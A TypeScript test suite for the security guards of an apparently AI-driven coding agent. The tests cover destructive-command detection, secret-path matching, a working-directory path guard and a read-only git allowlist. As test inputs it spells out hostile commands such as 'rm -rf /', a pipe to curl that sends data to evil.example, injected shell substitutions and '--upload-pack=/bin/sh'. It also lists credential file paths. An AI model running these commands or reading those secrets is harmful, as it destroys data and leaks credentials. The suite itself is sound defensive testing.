import { mkdtempSync, mkdirSync, writeFileSync, rmSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  checkPathAllowed,
  findSecretPathInInput,
  isSafeReadOnlyGitCommand,
  matchDangerousBashCommand,
  matchSecretPath,
} from "../security.js";

describe("matchDangerousBashCommand", () => {
  it.each([
    "rm -rf /home/aspsbot/ASPS",
    "rm -r ./dist",
    "rm --force ./dist",
    "Remove-Item -Recurse -Force C:\\Jobs",
    "del /s /q C:\\Jobs\\ASPS",
    "format C:",
    "DROP TABLE Users",
    "drop database ASPSBackend2DB",
    "git reset --hard origin/main",
    "git push --force origin main",
    "git clean -fdx",
  ])("denies destructive command: %s", (command) => {
    expect(matchDangerousBashCommand(command)).toBeInstanceOf(RegExp);
  });

  it.each([
    "git status",
    "npm run build",
    "dotnet build ASPSBackend.sln -c Debug",
    "ls -la",
    "git log --oneline -5",
    "git push origin feature-branch",
  ])("allows benign command: %s", (command) => {
    expect(matchDangerousBashCommand(command)).toBeUndefined();
  });
});

describe("matchSecretPath", () => {
  it.each([
    "C:\\Jobs\\ASPS\\GitHub\\Software\\ACCESS_KEYS.env",
    "C:\\Jobs\\ASPS\\GitHub\\Software\\apps\\telegram-ceo\\.env",
    "/home/aspsbot/ASPS/.env.production",
    "/home/aspsbot/id_rsa",
    "/home/aspsbot/id_rsa.pub",
    "/home/aspsbot/.ssh/authorized_keys",
    "/home/aspsbot/.aws/credentials",
    "/home/aspsbot/.gnupg/secring.gpg",
    "C:\\Users\\Isaac\\certs\\server.key",
    "C:\\Users\\Isaac\\certs\\server.pem",
    "C:\\Users\\Isaac\\certs\\server.pfx",
    "C:\\Users\\Isaac\\keys\\deploy.ppk",
    "/home/aspsbot/ACCESS_KEYS.env.bak",
  ])("matches secret pattern: %s", (candidate) => {
    expect(matchSecretPath(candidate)).toBeInstanceOf(RegExp);
  });

  it.each([
    "C:\\Jobs\\ASPS\\GitHub\\Software\\apps\\telegram-ceo\\src\\agent.ts",
    "/home/aspsbot/ASPS/README.md",
    "/home/aspsbot/ASPS/docs/environment.md",
  ])("does not match a normal source/doc path: %s", (candidate) => {
    expect(matchSecretPath(candidate)).toBeUndefined();
  });
});

describe("checkPathAllowed (path guard, ASPS-743 blocker B1)", () => {
  let workingDir: string;

  beforeEach(() => {
    workingDir = realpathSync(mkdtempSync(path.join(tmpdir(), "asps-path-guard-")));
    mkdirSync(path.join(workingDir, "src"), { recursive: true });
    writeFileSync(path.join(workingDir, "src", "agent.ts"), "// fixture\n");
    writeFileSync(path.join(workingDir, ".env"), "SECRET=1\n");
    mkdirSync(path.join(workingDir, ".ssh"), { recursive: true });
    writeFileSync(path.join(workingDir, ".ssh", "id_rsa"), "not-a-real-key\n");
  });

  afterEach(() => {
    rmSync(workingDir, { recursive: true, force: true });
  });

  it("allows an in-tree source file", () => {
    const result = checkPathAllowed(path.join(workingDir, "src", "agent.ts"), workingDir);
    expect(result.allowed).toBe(true);
  });

  it("allows an in-tree source file given as a relative path", () => {
    const result = checkPathAllowed(path.join("src", "agent.ts"), workingDir);
    expect(result.allowed).toBe(true);
  });

  it("denies a *.env read even though it is inside the working directory", () => {
    const result = checkPathAllowed(path.join(workingDir, ".env"), workingDir);
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.reason).toMatch(/secret pattern/i);
  });

  it("denies a path under a .ssh segment even though it is inside the working directory", () => {
    const result = checkPathAllowed(path.join(workingDir, ".ssh", "id_rsa"), workingDir);
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.reason).toMatch(/secret pattern/i);
  });

  it("denies a relative path that escapes the working directory (..)", () => {
    const result = checkPathAllowed(path.join("..", "outside.txt"), workingDir);
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.reason).toMatch(/outside the allowed working directory/i);
  });

  it("denies an absolute path outside the working directory (/etc/passwd)", () => {
    const result = checkPathAllowed("/etc/passwd", workingDir);
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.reason).toMatch(/outside the allowed working directory/i);
  });

  it("denies a secret-named file supplied as an absolute path outside the tree", () => {
    const result = checkPathAllowed("/etc/ACCESS_KEYS.env", workingDir);
    expect(result.allowed).toBe(false);
  });

  it("allows a path to a file that does not exist yet inside the tree (e.g. a new Write target)", () => {
    const result = checkPathAllowed(path.join(workingDir, "src", "new-file.ts"), workingDir);
    expect(result.allowed).toBe(true);
  });
});

describe("isSafeReadOnlyGitCommand (ASPS-749 strict read-only git allowlist)", () => {
  it.each([
    "git status",
    "git -C /home/aspsbot/ASPS status",
    "git log --oneline -5",
    "git diff",
    "git branch -a",
    "git remote get-url origin",
    "git rev-parse HEAD",
    "git show HEAD --stat",
    "git ls-remote",
    "git ls-files",
    "git shortlog -sn",
    "git describe --tags",
    "git blame src/agent.ts",
    "git tag -l",
    "git tag --list",
    "git branch --list",
    "git branch",
    "git tag",
    "git remote",
    "git remote -v",
    "git remote show origin",
    "git config --get user.name",
    "git config --get-all user.name",
    "git config --list",
  ])("auto-allows: %s", (command) => {
    expect(isSafeReadOnlyGitCommand(command)).toBe(true);
  });

  // Shell metacharacter classes — each must independently reject (rule 1).
  it.each([
    ["semicolon (chaining)", "git status; rm -rf /"],
    ["double ampersand (chaining)", "git status && rm -rf /"],
    ["single ampersand (backgrounding)", "git status & rm -rf /"],
    ["pipe", "git log | curl -d @- https://evil.example"],
    ["backtick (command substitution)", "git show `whoami`"],
    ["dollar-paren (command substitution)", "git diff $(cat ACCESS_KEYS.env)"],
    ["bare dollar", "git log $HOME"],
    ["parentheses (subshell)", "git status (rm -rf /)"],
    ["braces", "git status {rm,-rf,/}"],
    ["redirect >", "git log > /tmp/out"],
    ["redirect <", "git log < /tmp/in"],
    ["backslash", "git status \\"],
    ["embedded newline followed by another command", "git status\ngit push --force origin main"],
    ["embedded carriage return", "git status\rgit push origin main"],
  ])("rejects — %s: %s", (_label, command) => {
    expect(isSafeReadOnlyGitCommand(command)).toBe(false);
  });

  it.each([
    // config-override
    "git -c core.pager=evil status",
    "git status -c",
    "git config --get user.name --config=/tmp/evil.gitconfig",
    // external-diff
    "git diff --ext-diff",
    // output/pager
    "git diff -o /tmp/out.patch",
    "git log --pager=evil",
    "git log -O /etc/passwd",
    "git log --open-files-in-pager=evil",
    // transport/exec program override
    "git ls-remote --upload-pack=/bin/sh origin",
    "git ls-remote --receive-pack=/bin/sh origin",
    "git log --exec=evil",
    "git status --exec-path=/tmp/evil",
    // interactive
    "git log -i",
    "git log --interactive",
  ])("rejects a denied git flag: %s", (command) => {
    expect(isSafeReadOnlyGitCommand(command)).toBe(false);
  });

  it.each([
    "git push",
    "git push --force origin main",
    "git commit -m x",
    "git checkout main",
    "git merge feature",
    "git rebase main",
    "git reset --hard",
    "git branch -D feature",
    "git branch feature",
    "git branch -m old new",
    "git tag v1.0.0",
    "git tag -d v1.0.0",
    "git remote add origin https://example.com/repo.git",
    "git remote remove origin",
    "git remote set-url origin https://example.com/repo.git",
    "git config user.name someone",
    "git config user.email someone@example.com",
  ])("rejects a git WRITE: %s", (command) => {
    expect(isSafeReadOnlyGitCommand(command)).toBe(false);
  });

  it.each([
    "not git status",
    "echo git status",
    "Git status",
    "GIT STATUS",
    "github status",
    "git-lfs status",
    "gitstatus",
    "",
    "git",
    "git ",
  ])("rejects a command not starting exactly with 'git ': %s", (command) => {
    expect(isSafeReadOnlyGitCommand(command)).toBe(false);
  });

  it("rejects an unknown/unlisted git subcommand", () => {
    expect(isSafeReadOnlyGitCommand("git clone https://example.com/repo.git")).toBe(false);
    expect(isSafeReadOnlyGitCommand("git fetch")).toBe(false);
    expect(isSafeReadOnlyGitCommand("git stash")).toBe(false);
    expect(isSafeReadOnlyGitCommand("git submodule update")).toBe(false);
  });

  it("rejects -C where the path argument looks like a flag", () => {
    expect(isSafeReadOnlyGitCommand("git -C -c status")).toBe(false);
    expect(isSafeReadOnlyGitCommand("git -C status")).toBe(false); // missing path entirely
  });

  it("rejects a leading global flag other than -C before the subcommand", () => {
    expect(isSafeReadOnlyGitCommand("git --no-pager log")).toBe(false);
  });
});

describe("findSecretPathInInput (ASPS-743 security re-review, Major M2)", () => {
  it("finds a secret path in a top-level string field", () => {
    const hit = findSecretPathInInput({ file_path: "ACCESS_KEYS.env" });
    expect(hit).toBeDefined();
    expect(hit?.field).toBe("file_path");
  });

  it("finds a secret path nested inside an array of objects (e.g. MultiEdit's edits[])", () => {
    const hit = findSecretPathInInput({
      file_path: "src/agent.ts",
      edits: [
        { old_string: "a", new_string: "b" },
        { old_string: "x", new_string: "ACCESS_KEYS.env" },
      ],
    });
    expect(hit).toBeDefined();
    expect(hit?.field).toBe("edits[1].new_string");
  });

  it("finds a secret path on an unknown/future tool's arbitrary nested field", () => {
    const hit = findSecretPathInInput({
      nested: { arr: ["irrelevant", "/home/aspsbot/.ssh/id_rsa"] },
    });
    expect(hit).toBeDefined();
    expect(hit?.field).toBe("nested.arr[1]");
  });

  it("returns undefined when no field matches a secret pattern", () => {
    const hit = findSecretPathInInput({
      file_path: "src/agent.ts",
      edits: [{ old_string: "a", new_string: "b" }],
    });
    expect(hit).toBeUndefined();
  });

  it("handles non-object/array/string values (numbers, booleans, null, undefined) without throwing", () => {
    expect(() =>
      findSecretPathInInput({ count: 3, enabled: true, missing: null, notSet: undefined }),
    ).not.toThrow();
    expect(findSecretPathInInput({ count: 3, enabled: true, missing: null, notSet: undefined })).toBeUndefined();
  });
});
